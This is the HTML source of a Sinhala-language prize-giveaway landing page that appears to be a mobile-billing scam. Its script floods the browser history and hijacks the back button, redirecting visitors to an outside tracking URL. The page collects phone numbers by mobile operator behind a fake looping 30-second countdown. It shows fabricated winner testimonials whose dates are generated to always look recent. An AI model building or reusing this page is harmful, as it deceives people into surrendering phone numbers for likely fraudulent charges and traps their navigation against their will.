<!doctype html>
<html lang="si" dir="ltr">
<head>
<title>සුභ පැතුම්!</title>

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
<link href="landers/pick-a-prize/assets/app.css" type="text/css" rel="stylesheet" />
<script>
  ! function() {
    var t;
    var tmp = "https://1d741c34df0.quickpowerclicks.com/?p=6275&wid=136266&wid_hmac=5c0361b4c421adacb563792d0e31ca90&o_settings%5Bprize%5D=cash-2500-usd&pi=back_pin&click_id=SfeMNfo8xPQvPFqEWrGM9w";
    try {
      for (t = 0; 10 > t; ++t) history.pushState({}, '', '');
      onpopstate = function(t) {
        t.state && location.replace(tmp);
      }
    } catch (o) {}
  }();

  function startCountdown(duration, display) {
    var timer = duration, seconds;
    setInterval(function () {
      seconds = parseInt(timer % 60, 10);

      seconds = seconds < 10 ? "0" + seconds : seconds;

      display.textContent = seconds;

      if (--timer < 0) {
          timer = duration; // Optionally reset the timer here or do something else when it reaches 0
      }
    }, 1000);
  }

  window.onload = function () {
    var duration = 30; // Duration in seconds
    var display = document.querySelector('#time'); // Displaying the countdown in this element
    startCountdown(duration, display);
  };

  function airtel() {
        window.location.href = 'form.php?click_id=SfeMNfo8xPQvPFqEWrGM9w&operator=airtel'
    console.log('airtel');
  }

  function dialog() {
        window.location.href = 'form.php?click_id=SfeMNfo8xPQvPFqEWrGM9w&operator=dialog'
  }

  function mobitel() {
        window.location.href = 'form.php?click_id=SfeMNfo8xPQvPFqEWrGM9w&operator=mobitel'
  }

  function hutch() {
        window.location.href = 'form.php?click_id=SfeMNfo8xPQvPFqEWrGM9w&operator=hutch'
  }

  function hideOperators() {
    document.getElementById('operators').style.display = 'none';
    document.getElementById('form').style.display = 'block';
  }
</script>
<style>
canvas {
  display: none;
}
</style>
</head>

<body class="theme--default">

    <main id="app" v-cloak>
      <div class="header">
                  <img
            class="header__menu"
            src="landers/pick-a-prize/assets/img/menu.svg"
            alt="Menu"
          >
                <img
          class="header__logo"
          src="landers/pick-a-prize/assets/img/logo/default.svg"
          alt="Image"
        />
                  <img
            class="header__account"
            src="landers/pick-a-prize/assets/img/account.svg"
            alt="Account"
          >
              </div>
      <div class="content">
        <div class="prize">

          <div id="operators">
            <div class="h1 block">ඔබගේ ජංගම ක්රියාකරු තෝරන්න</div>
            <div class="operators">
              <div class="operators__button" onClick="airtel();">
                <img src="img/operators/airtel.svg" />
                <div class="operators__label">airtel</div>
              </div>
              <div class="operators__button" onClick="dialog();">
                <img src="img/operators/dialog.svg" />
                <div class="operators__label">dialog</div>
              </div>
              <div class="operators__button" onClick="mobitel();">
                <img src="img/operators/mobitel.svg" />
                <div class="operators__label">mobitel</div>
              </div>
              <div class="operators__button" onClick="hutch();">
                <img src="img/operators/hutch.svg" />
                <div class="operators__label">hutch</div>
              </div>
            </div>
          </div>

          <div id="form" style="display:none;">
            
            <form method="POST">
              <label class="h1 block" for="msisdn">කරුණාකර ඔබගේ ජංගම දුරකථන අංකය ඇතුලත් කරන්න</label>
              <input class="input" type="text" name="msisdn" id="msisdn" placeholder="94xxxxxxxx">
              <input class="btn" type="submit" value="යවන්න"/>
            </form>
            <div class="mt-10">පිරිනැමීම අවසන් වන්නේ: <span id="time">30</span> තත්පර</div>
          </div>
        </div>
        <div class="testimonials">
          <h2 class="testimonials__title">ඉමහත් කීර්තිය</h2>
          <prize-comment
            avatar="img/profiles/south-asian/female/3@0.25x.jpg"
            name="Samadhi Seneviratne"
            :date="`${DateHelper().getMonthName({ days: -1 })} ${DateHelper().getDate({ days: -1 })}, ${DateHelper().getYear({ days: -1 })}`"
            message="ත්‍යාගය: රු. 470,000.00 ක මුදල්"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/male/3@0.25x.jpg"
            name="Shehan Nandasiri"
            :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`"
            message="ත්‍යාගය: Mobile S22"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/male/10@0.25x.jpg"
            name="Kasun Abeynaike"
            :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`"
            message="ත්‍යාගය: Mobile S22"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/female/6@0.25x.jpg"
            name="Fathima Fonseca"
            :date="`${DateHelper().getMonthName({ days: -3 })} ${DateHelper().getDate({ days: -3 })}, ${DateHelper().getYear({ days: -3 })}`"
            message="ත්‍යාගය: රු. 470,000.00 ක මුදල්"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/male/9@0.25x.jpg"
            name="Tharindu Balasuriya"
            :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`"
            message="ත්‍යාගය: රු. 470,000.00 ක මුදල්"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/female/5@0.25x.jpg"
            name="Rashmi Karunaratne"
            :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`"
            message="ත්‍යාගය: Supermarket $1000 තෑගි කාඩ්පත"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/female/1@0.25x.jpg"
            name="Nethmi Abeynaike"
            :date="`${DateHelper().getMonthName({ days: -6 })} ${DateHelper().getDate({ days: -6 })}, ${DateHelper().getYear({ days: -6 })}`"
            message="ත්‍යාගය: රු. 470,000.00 ක මුදල්"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/male/2@0.25x.jpg"
            name="Sandun Fonseca"
            :date="`${DateHelper().getMonthName({ days: -7 })} ${DateHelper().getDate({ days: -7 })}, ${DateHelper().getYear({ days: -7 })}`"
            message="ත්‍යාගය: Supermarket $1000 තෑගි කාඩ්පත"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/male/6@0.25x.jpg"
            name="Lahiru Hathurusingha"
            :date="`${DateHelper().getMonthName({ days: -8 })} ${DateHelper().getDate({ days: -8 })}, ${DateHelper().getYear({ days: -8 })}`"
            message="ත්‍යාගය: Supermarket $1000 තෑගි කාඩ්පත"
          ></prize-comment>
          <prize-comment
            avatar="img/profiles/south-asian/male/8@0.25x.jpg"
            name="Supun Dahanayake"
            :date="`${DateHelper().getMonthName({ days: -9 })} ${DateHelper().getDate({ days: -9 })}, ${DateHelper().getYear({ days: -9 })}`"
            message="ත්‍යාගය: රු. 470,000.00 ක මුදල්"
          ></prize-comment>
        </div>
      </div>
    </main>

<script>
</script>
<script>window.view = window.view || {};view.offerUrl = "https:\/\/www.thorzoo.com";view.popunderUrl = null;view.trafficDomain = "https:\/\/www.thorzoo.com";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noHistory = 0;view.noredir = false;view.lang = "en";view.country = "nl";</script><script>window.view = window.view || {};view.datetimeTranslations = {"ago":":time ago","from_now":":time from now","after":":time after","before":":time before","year":"1 year|:count years","month":"1 month|:count months","week":"1 week|:count weeks","day":"1 day|:count days","hour":"1 hour|:count hours","minute":"1 minute|:count minutes","second":"1 second|:count seconds","january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December","monday":"Monday","tuesday":"Tuesday","wednesday":"Wednesday","thursday":"Thursday","friday":"Friday","saturday":"Saturday","sunday":"Sunday"};</script><script type="application/javascript" src="landers/pick-a-prize/assets/app.js"></script>
</body>
</html>
